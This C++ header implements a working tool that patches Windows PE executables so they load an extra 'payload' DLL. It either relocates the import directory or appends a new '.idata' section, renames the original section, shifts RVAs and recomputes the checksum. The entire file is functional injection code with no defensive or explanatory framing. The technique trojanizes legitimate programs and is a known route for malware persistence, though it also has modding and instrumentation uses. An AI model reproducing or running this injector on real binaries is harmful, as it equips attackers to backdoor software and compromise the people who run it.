#pragma once

#include <cstdint>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <vector>

#include "shared.h"

#pragma warning(disable: 4267)

namespace wrappem {

inline constexpr const char*
MachineType(const uint16_t machine)
{
  switch (machine)
  {
  case 0x014c:
    return "pe32";
    break;
  case 0x8664:
    return "pe64";
    break;
  default:
    return "unknown";
    break;
  }
}

inline constexpr uint32_t
Align(const uint32_t value, const uint32_t alignment)
{
  return (value + alignment - 1) & ~(alignment - 1);
}

inline constexpr uint32_t
Pad(const uint32_t size, const uint32_t padding)
{
  return size + (padding - (size % padding));
}

struct DosHeader
{
  uint8_t  e_magic[2];
  uint16_t e_cblp;
  uint16_t e_cp;
  uint16_t e_crlc;
  uint16_t e_cparhdr;
  uint16_t e_minalloc;
  uint16_t e_maxalloc;
  uint16_t e_ss;
  uint16_t e_sp;
  uint16_t e_csum;
  uint16_t e_ip;
  uint16_t e_cs;
  uint16_t e_lfarlc;
  uint16_t e_ovno;
  uint16_t e_res1[4];
  uint16_t e_oemid;
  uint16_t e_oeminfo;
  uint16_t e_res2[10];
  // NOTE: file offset of NtHeader
  uint32_t e_lfanew;
};

struct FileHeader
{
  uint16_t Machine;
  uint16_t NumberOfSections;
  uint32_t TimeDateStamp;
  uint32_t PointerToSymbolTable;
  uint32_t NumberOfSymbols;
  uint16_t SizeOfOptionalHeader;
  uint16_t Characteristics;
};

struct NtHeader
{
  uint8_t Signature[4];
  FileHeader FileHeader;
};

struct DataDirectory
{
  uint32_t VirtualAddress;
  uint32_t Size;
};

// NOTE: import table must be terminated by an empty ImportDirectory
struct ImportDirectory
{
  uint32_t rvaImportLookupTable;
  uint32_t TimeDateStamp;
  uint32_t ForwarderChain;
  uint32_t rvaModuleName;
  uint32_t rvaImportAddressTable;
};

constexpr uint32_t
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16;

struct OptionalHeader32
{
  uint16_t Magic;
  uint8_t MajorLinkerVersion;
  uint8_t MinorLinkerVersion;
  uint32_t SizeOfCode;
  uint32_t SizeOfInitializedData;
  uint32_t SizeOfUninitializedData;
  uint32_t AddressOfEntryPoint;
  uint32_t BaseOfCode;
  uint32_t BaseOfData;
  uint32_t ImageBase;
  uint32_t SectionAlignment;
  uint32_t FileAlignment;
  uint16_t MajorOperatingSystemVersion;
  uint16_t MinorOperatingSystemVersion;
  uint16_t MajorImageVersion;
  uint16_t MinorImageVersion;
  uint16_t MajorSubsystemVersion;
  uint16_t MinorSubsystemVersion;
  uint32_t Win32VersionValue;
  uint32_t SizeOfImage;
  uint32_t SizeOfHeaders;
  uint32_t CheckSum;
  uint16_t Subsystem;
  uint16_t DllCharacteristics;
  uint32_t SizeOfStackReserve;
  uint32_t SizeOfStackCommit;
  uint32_t SizeOfHeapReserve;
  uint32_t SizeOfHeapCommit;
  uint32_t LoaderFlags;
  uint32_t NumberOfRvaAndSizes;
  // NOTE: last entry must be an empty DataDirectory
  DataDirectory DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
};

struct OptionalHeader64
{
  uint16_t Magic;
  uint8_t MajorLinkerVersion;
  uint8_t MinorLinkerVersion;
  uint32_t SizeOfCode;
  uint32_t SizeOfInitializedData;
  uint32_t SizeOfUninitializedData;
  uint32_t AddressOfEntryPoint;
  uint32_t BaseOfCode;
  uint64_t ImageBase;
  uint32_t SectionAlignment;
  uint32_t FileAlignment;
  uint16_t MajorOperatingSystemVersion;
  uint16_t MinorOperatingSystemVersion;
  uint16_t MajorImageVersion;
  uint16_t MinorImageVersion;
  uint16_t MajorSubsystemVersion;
  uint16_t MinorSubsystemVersion;
  uint32_t Win32VersionValue;
  uint32_t SizeOfImage;
  uint32_t SizeOfHeaders;
  uint32_t CheckSum;
  uint16_t Subsystem;
  uint16_t DllCharacteristics;
  uint64_t SizeOfStackReserve;
  uint64_t SizeOfStackCommit;
  uint64_t SizeOfHeapReserve;
  uint64_t SizeOfHeapCommit;
  uint32_t LoaderFlags;
  uint32_t NumberOfRvaAndSizes;
  // NOTE: last entry must be an empty DataDirectory
  DataDirectory DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
};

struct SectionParams
{
  char Name[8];
  union {
    uint32_t PhysicalAddress;
    uint32_t VirtualSize;
  } Misc;
  uint32_t VirtualAddress;
  uint32_t SizeOfRawData;
  uint32_t PointerToRawData;
  uint32_t PointerToRelocations;
  uint32_t PointerToLinenumbers;
  uint16_t NumberOfRelocations;
  uint16_t NumberOfLinenumbers;
  uint32_t Characteristics;
};

class PatchPE
{
private:
  enum class EmptySpace
  {
    SPACE_NONE,
    SPACE_EXPAND,
    SPACE_RELOCATE,
    SPACE_CREATE
  };

  const char magic_[2] = { 'M', 'Z' };
  const char sig_[4]   = { 'P', 'E', '\0', '\0' };

  bool is32_;
  EmptySpace hasSpace_;

  DosHeader* dos_;
  NtHeader*  nt_;
  union Optional
  {
    OptionalHeader32* u32;
    OptionalHeader64* u64;
  } optional_;

  DataDirectory*   importTable_;
  ImportDirectory* iaTable_;
  SectionParams*   idataSection_;
  SectionParams*   lastSection_;

  uint8_t*  fileBytes_ = nullptr;
  uintmax_t fileSize_ = 0;
  uint8_t*  secBytes_ = nullptr;
  uintmax_t secSize_ = 0;

  EmptySpace
  FindEmptySpace_(const std::size_t min)
  {
    idataSection_ = reinterpret_cast<SectionParams*>(
      fileBytes_ + dos_->e_lfanew + sizeof(NtHeader) +
      nt_->FileHeader.SizeOfOptionalHeader);

    lastSection_ = &idataSection_[nt_->FileHeader.NumberOfSections - 1];
    for (uint16_t i = 0; i < nt_->FileHeader.NumberOfSections; i++)
    {
      if (idataSection_->VirtualAddress <= importTable_->VirtualAddress &&
          idataSection_->VirtualAddress + idataSection_->Misc.VirtualSize >=
          importTable_->VirtualAddress + importTable_->Size)
      {
        uint32_t ia = importTable_->VirtualAddress -
                      idataSection_->VirtualAddress +
                      idataSection_->PointerToRawData;

        std::cout << __c(42, "[+]") << " Import table at section: "
                  << idataSection_->Name << std::endl;
        std::cout << __c(42, "[+]") << " Import table address: "
                  << ia << std::endl;

        iaTable_ = reinterpret_cast<ImportDirectory*>(fileBytes_ + ia);
        uint32_t diff =
          idataSection_->SizeOfRawData - idataSection_->Misc.VirtualSize;
        if (diff >= importTable_->Size + sizeof(ImportDirectory) &&
            importTable_->Size >= min)
        {
          return EmptySpace::SPACE_RELOCATE;
        }
        if (diff >= min)
        {
          return EmptySpace::SPACE_EXPAND;
        }
        break;
      }
      idataSection_++;
    }

    if (idataSection_ == nullptr)
    {
      throw std::runtime_error("could not find import data section.");
    }
    return EmptySpace::SPACE_CREATE;
  }

  uint32_t
  CalculatePECheckSum_(const uint8_t* buffer,
                       std::size_t size, uint32_t checksumOffset)
  {
    uint64_t checksum = 0;
    const uint16_t* ptr = reinterpret_cast<const uint16_t*>(buffer);
    std::size_t words = size / 2;
    for (std::size_t i = 0; i < words; ++i)
    {
      if (i == checksumOffset / 2 || i == (checksumOffset / 2) + 1)
      {
        continue;
      }
      checksum += ptr[i];
      checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }
    if (size % 2 != 0)
    {
      checksum += buffer[size - 1];
      checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }
    checksum = (checksum & 0xFFFF) + (checksum >> 16);
    checksum += static_cast<uint64_t>(size);
    return static_cast<uint32_t>(checksum);
  }

  void
  LoadFile_(const std::filesystem::path& filename)
  {
    std::ifstream file;
    file.open(filename, std::ios::binary);

    std::cout << "    Parsing file..." << std::endl;
    fileSize_ = std::filesystem::file_size(filename);
    fileBytes_ = new uint8_t[fileSize_];
    file.read(reinterpret_cast<char*>(fileBytes_), fileSize_);
    file.close();
  }

  void
  ParseHeaders_()
  {
    dos_ = reinterpret_cast<DosHeader*>(fileBytes_);
    if (memcmp(dos_->e_magic, magic_, 2) != 0)
    {
      throw std::runtime_error("file has invalid DOS header.");
    }

    nt_ = reinterpret_cast<NtHeader*>(fileBytes_ + dos_->e_lfanew);
    if (memcmp(nt_->Signature, sig_, 4) != 0)
    {
      throw std::runtime_error("file has invalid NT header.");
    }

    std::cout << __c(42, "[+]") << " Machine: "
              << MachineType(nt_->FileHeader.Machine) << std::endl;
    std::cout << __c(42, "[+]") << " Number of section: "
              << nt_->FileHeader.NumberOfSections << std::endl;
    std::cout << __c(42, "[+]") << " Size of optional header: "
              << nt_->FileHeader.SizeOfOptionalHeader << std::endl;

    if (nt_->FileHeader.SizeOfOptionalHeader == sizeof(OptionalHeader32))
    {
      is32_ = true;
      optional_.u32 = reinterpret_cast<OptionalHeader32*>(
        fileBytes_ + dos_->e_lfanew + sizeof(NtHeader));
    }
    else
    {
      is32_ = false;
      optional_.u64 = reinterpret_cast<OptionalHeader64*>(
        fileBytes_ + dos_->e_lfanew + sizeof(NtHeader));
    }
  }

  void
  ParseImportTable_()
  {
    importTable_ = (is32_) ?
      &optional_.u32->DataDirectory[1] : &optional_.u64->DataDirectory[1];

    if (importTable_->VirtualAddress == 0 || importTable_->Size == 0)
    {
      throw std::runtime_error(
        "file has no import table directory.");
    }
    std::cout << __c(42, "[+]") << " Import table size (bytes): "
              << importTable_->Size << std::endl;
  }

  void
  InjectByRelocating_(const std::string& dummyname,
                      const std::string& payload,
                      uint32_t minSize)
  {
    ImportDirectory* dest = reinterpret_cast<ImportDirectory*>(
      fileBytes_ + idataSection_->PointerToRawData +
      idataSection_->Misc.VirtualSize);

    memcpy(dest + 1, iaTable_, importTable_->Size);
    uint8_t* tmp = reinterpret_cast<uint8_t*>(iaTable_);
    iaTable_ = dest;
    iaTable_->ForwarderChain = 0;
    iaTable_->TimeDateStamp = 0;
    memset(tmp, 0, 2);

    uint32_t offset = 2;
    memcpy(tmp + offset, dummyname.c_str(), dummyname.length());
    offset += dummyname.length();

    uint32_t padding = Pad(dummyname.length() + 1, 2);
    memset(tmp + offset, 0, padding);
    offset += padding;

    memcpy(tmp + offset, payload.c_str(), payload.length());
    iaTable_->rvaModuleName = importTable_->VirtualAddress + offset;
    offset += payload.length();

    padding = Pad(payload.length() + 1, 2);
    memset(tmp + offset, 0, padding);
    offset += padding;

    uint32_t rva = importTable_->VirtualAddress;
    memcpy(tmp + offset, &rva, 4);
    iaTable_->rvaImportLookupTable = importTable_->VirtualAddress + offset;
    offset += 4;

    uint32_t pad64 = is32_ ? 0 : 8;
    uint32_t pad_common = 4;
    memset(tmp + offset, 0, pad64);
    offset += pad64;
    memset(tmp + offset, 0, pad_common);
    offset += pad_common;

    memcpy(tmp + offset, &rva, 4);
    iaTable_->rvaImportAddressTable = importTable_->VirtualAddress + offset;
    offset += 4;

    memset(tmp + offset, 0, pad64);
    offset += pad64;
    memset(tmp + offset, 0, 4 + sizeof(ImportDirectory));

    importTable_->VirtualAddress = idataSection_->Misc.VirtualSize +
                                   idataSection_->VirtualAddress;
    idataSection_->Misc.VirtualSize += minSize + importTable_->Size;
    importTable_->Size += sizeof(ImportDirectory);
  }

  void
  ShiftRVAs_(uint32_t virtualOffset)
  {
    std::cout << "    Shifting RVAs..." << std::endl;
    ImportDirectory* importDir = reinterpret_cast<ImportDirectory*>(secBytes_);

    while (importDir->rvaModuleName != 0)
    {
      if (importDir->rvaImportLookupTable != 0)
      {
        uint32_t intRawOffset =
          importDir->rvaImportLookupTable - idataSection_->VirtualAddress;

        if (is32_)
        {
          uint32_t* thunk = reinterpret_cast<uint32_t*>(
            secBytes_ + intRawOffset);
          while (*thunk != 0)
          {
            if (!(*thunk & 0x80000000))
            {
              *thunk += virtualOffset;
            }
            thunk++;
          }
        }
        else
        {
          uint64_t* thunk = reinterpret_cast<uint64_t*>(
            secBytes_ + intRawOffset);
          while (*thunk != 0)
          {
            if (!(*thunk & 0x8000000000000000ULL))
            {
              *thunk += virtualOffset;
            }
            thunk++;
          }
        }
        importDir->rvaImportLookupTable += virtualOffset;
      }

      if (importDir->rvaImportAddressTable != 0)
      {
        uint32_t iatRawOffset = importDir->rvaImportAddressTable -
          idataSection_->VirtualAddress;

        if (is32_)
        {
          uint32_t* thunk = reinterpret_cast<uint32_t*>(
            secBytes_ + iatRawOffset);
          while (*thunk != 0)
          {
            if (!(*thunk & 0x80000000))
            {
              *thunk += virtualOffset;
            }
            thunk++;
          }
        }
        else
        {
          uint64_t* thunk = reinterpret_cast<uint64_t*>(
            secBytes_ + iatRawOffset);
          while (*thunk != 0)
          {
            if (!(*thunk & 0x8000000000000000ULL))
            {
              *thunk += virtualOffset;
            }
            thunk++;
          }
        }
        importDir->rvaImportAddressTable += virtualOffset;
      }
      importDir->rvaModuleName += virtualOffset;
      importDir++;
    }
  }

  void
  InjectByNewSection_(const std::string& dummyname,
                      const std::string& payload,
                      uint32_t newSectionOffset)
  {
    uint32_t sectionAlign = (is32_) ?
      optional_.u32->SectionAlignment : optional_.u64->SectionAlignment;
    uint32_t fileAlign = (is32_) ?
      optional_.u32->FileAlignment : optional_.u64->FileAlignment;

    SectionParams* newSection = reinterpret_cast<SectionParams*>(
      fileBytes_ + newSectionOffset);
    SectionParams* lastSection = reinterpret_cast<SectionParams*>(
      fileBytes_ + newSectionOffset - sizeof(SectionParams));

    memcpy(idataSection_->Name, ".notid\0\0", 8);
    memcpy(newSection->Name, ".idata\0\0", 8);
    newSection->Characteristics = 0xC0000040;

    uint32_t va = lastSection->VirtualAddress +
      lastSection->Misc.VirtualSize;
    newSection->VirtualAddress = Align(va, sectionAlign);

    uint32_t raw = lastSection->PointerToRawData +
      lastSection->SizeOfRawData;
    newSection->PointerToRawData = Align(raw, fileAlign);

    uint32_t virtualOffset =
      newSection->VirtualAddress - idataSection_->VirtualAddress;
    uint32_t oldDirTableSize = importTable_->Size;
    uint32_t newDirTableSize =
      oldDirTableSize + sizeof(ImportDirectory);

    uint32_t nameLen = dummyname.length();
    uint32_t namePad = Pad(nameLen + 1, 2);
    uint32_t dllLen = payload.length();
    uint32_t dllPad = Pad(dllLen + 1, 2);
    uint32_t thunkSpace = is32_ ? 8 : 16;
    uint32_t payloadDataSize = 2 + nameLen + namePad +
      dllLen + dllPad + (thunkSpace * 2);

    uint32_t newVirtualSize = idataSection_->Misc.VirtualSize +
      payloadDataSize + newDirTableSize;
    secSize_ = Align(newVirtualSize, fileAlign);
    secBytes_ = new uint8_t[secSize_]();

    memcpy(secBytes_,
      fileBytes_ + idataSection_->PointerToRawData,
      idataSection_->SizeOfRawData
    );
    ShiftRVAs_(virtualOffset);

    std::cout << "    Injecting payload..." << std::endl;
    uint32_t oldDirOffset =
      importTable_->VirtualAddress - idataSection_->VirtualAddress;
    ImportDirectory* oldDirInBuf =
      reinterpret_cast<ImportDirectory*>(secBytes_ + oldDirOffset);
    uint32_t newDirOffset = idataSection_->Misc.VirtualSize;
    ImportDirectory* newDirTable =
      reinterpret_cast<ImportDirectory*>(secBytes_ + newDirOffset);

    memcpy(newDirTable, oldDirInBuf, oldDirTableSize);
    uint32_t spotRVA = newSection->VirtualAddress + oldDirOffset;
    uint8_t* tmp = reinterpret_cast<uint8_t*>(oldDirInBuf);
    memset(tmp, 0, 2);

    uint32_t offset = 2;
    memcpy(tmp + offset, dummyname.c_str(), dummyname.length());
    offset += dummyname.length();

    uint32_t padding = Pad(dummyname.length() + 1, 2);
    memset(tmp + offset, 0, padding);
    offset += padding;

    uint32_t rvaModuleName = spotRVA + offset;
    memcpy(tmp + offset, payload.c_str(), payload.length());
    offset += payload.length();

    padding = Pad(payload.length() + 1, 2);
    memset(tmp + offset, 0, padding);
    offset += padding;

    uint32_t rvaHintName = spotRVA;
    memcpy(tmp + offset, &rvaHintName, 4);
    uint32_t rvaImportLookupTable = spotRVA + offset;
    offset += 4;

    uint32_t pad64 = is32_ ? 0 : 8;
    uint32_t pad_common = 4;
    memset(tmp + offset, 0, pad64);
    offset += pad64;
    memset(tmp + offset, 0, pad_common);
    offset += pad_common;

    memcpy(tmp + offset, &rvaHintName, 4);
    uint32_t rvaImportAddressTable = spotRVA + offset;
    offset += 4;
    memset(tmp + offset, 0, pad64);
    offset += pad64;
    memset(tmp + offset, 0, 4 + sizeof(ImportDirectory));

    ImportDirectory* newEntry = reinterpret_cast<ImportDirectory*>(
        reinterpret_cast<uint8_t*>(newDirTable) +
        oldDirTableSize - sizeof(ImportDirectory));

    newEntry->rvaImportLookupTable = rvaImportLookupTable;
    newEntry->TimeDateStamp = 0;
    newEntry->ForwarderChain = 0;
    newEntry->rvaModuleName = rvaModuleName;
    newEntry->rvaImportAddressTable = rvaImportAddressTable;
    memset(newEntry + 1, 0, sizeof(ImportDirectory));

    std::cout << "    Patch sizes and addresses..." << std::endl;
    importTable_->VirtualAddress =
      newSection->VirtualAddress + newDirOffset;
    importTable_->Size = newDirTableSize;

    newSection->Misc.VirtualSize = newDirOffset + newDirTableSize;
    newSection->SizeOfRawData = secSize_;
    nt_->FileHeader.NumberOfSections++;
    uint32_t alignedImageSize = Align(
      newSection->VirtualAddress + newSection->Misc.VirtualSize,
      sectionAlign
    );
    if (is32_)
    {
      optional_.u32->SizeOfImage = alignedImageSize;
    }
    else
    {
      optional_.u64->SizeOfImage = alignedImageSize;
    }
  }

  void
  EnsureDirectoryExists_(const std::filesystem::path& filePath)
  {
    std::filesystem::path parentDir = filePath.parent_path();
    if (!parentDir.empty() && !std::filesystem::exists(parentDir))
    {
      std::filesystem::create_directories(parentDir);
    }
  }

  std::vector<uint8_t>
  AssembleFinalImage_()
  {
    std::vector<uint8_t> finalFile;
    finalFile.insert(
      finalFile.end(), fileBytes_, fileBytes_ + fileSize_
    );

    if (secBytes_ != nullptr && secSize_ > 0)
    {
      SectionParams* appendedSection = reinterpret_cast<SectionParams*>(
        fileBytes_ + dos_->e_lfanew + sizeof(NtHeader) +
        nt_->FileHeader.SizeOfOptionalHeader +
        ((nt_->FileHeader.NumberOfSections - 1) * sizeof(SectionParams)));

      uint32_t expectedOffset = appendedSection->PointerToRawData;
      if (finalFile.size() < expectedOffset)
      {
        finalFile.resize(expectedOffset, 0);
      }
      else if (finalFile.size() > expectedOffset)
      {
        finalFile.resize(expectedOffset);
      }

      finalFile.insert(
        finalFile.end(), secBytes_, secBytes_ + secSize_
      );
    }
    return finalFile;
  }

  uint32_t
  UpdateCheckSum_(std::vector<uint8_t>& finalFile)
  {
    uint32_t checkSumOffset = dos_->e_lfanew + sizeof(NtHeader);
    if (is32_)
    {
      checkSumOffset += offsetof(OptionalHeader32, CheckSum);
    }
    else
    {
      checkSumOffset += offsetof(OptionalHeader64, CheckSum);
    }
    uint32_t newCheckSum = CalculatePECheckSum_(
      finalFile.data(), finalFile.size(),
      checkSumOffset
    );
    *reinterpret_cast<uint32_t*>(finalFile.data() + checkSumOffset) =
      newCheckSum;
    return newCheckSum;
  }

  void
  WriteToFile_(const std::filesystem::path& filename,
               const std::vector<uint8_t>& finalFile)
  {
    std::ofstream ofile(filename, std::ios::binary | std::ios::out);
    ofile.write(
      reinterpret_cast<const char*>(finalFile.data()),
      finalFile.size()
    );
    ofile.close();
  }

public:
  PatchPE(const std::filesystem::path& filename,
          const std::string& payload,
          const std::string& dummyname)
  {
    try
    {
      LoadFile_(filename);
      ParseHeaders_();
      ParseImportTable_();

      const uint32_t ltSize = 4 * ((is32_) ? 4 : 8);
      uint32_t minSize = sizeof(ImportDirectory) + ltSize;
      minSize += Pad(dummyname.length() + 3, 2);
      minSize += Pad(payload.length() + 1, 2);
      EmptySpace method = FindEmptySpace_(minSize);

      const uint32_t newSectionOffset = dos_->e_lfanew +
        sizeof(NtHeader) + nt_->FileHeader.SizeOfOptionalHeader +
        (nt_->FileHeader.NumberOfSections * sizeof(SectionParams));

      const uint32_t sizeOfHeaders = (is32_) ?
        optional_.u32->SizeOfHeaders : optional_.u64->SizeOfHeaders;

      std::cout << "    Method chosen: ";
      if (method == EmptySpace::SPACE_RELOCATE)
      {
        std::cout << "relocate import table..." << std::endl;
        InjectByRelocating_(dummyname, payload, minSize);
      }
      else if ((newSectionOffset + sizeof(SectionParams)) <= sizeOfHeaders)
      {
        std::cout << "move import data section..." << std::endl;
        InjectByNewSection_(dummyname, payload, newSectionOffset);
      }
      else if (method == EmptySpace::SPACE_EXPAND)
      {
        std::cout << "expand import table..." << std::endl;
        throw std::runtime_error("unavailable EXPAND method");
      }
      else
      {
        throw std::runtime_error(
          "no method is suitable for import injection");
      }
    }
    catch (const std::exception& e)
    {
      std::string err = "PEFormat ctor: ";
      err.append(e.what());
      throw std::runtime_error(err);
    }
  }

  ~PatchPE()
  {
    if (fileBytes_ != nullptr)
    {
      delete[] fileBytes_;
    }
    if (secBytes_ != nullptr)
    {
      delete[] secBytes_;
    }
  }

  void
  Save(const std::filesystem::path& filename)
  {
    std::cout << "    Saving to output file..." << std::endl;
    EnsureDirectoryExists_(filename);

    std::vector<uint8_t> finalFile = AssembleFinalImage_();
    uint32_t newCheckSum = UpdateCheckSum_(finalFile);

    WriteToFile_(filename, finalFile);
    std::cout << "    CheckSum updated to: 0x" << std::hex
              << newCheckSum << std::dec << std::endl;
  }
};

}
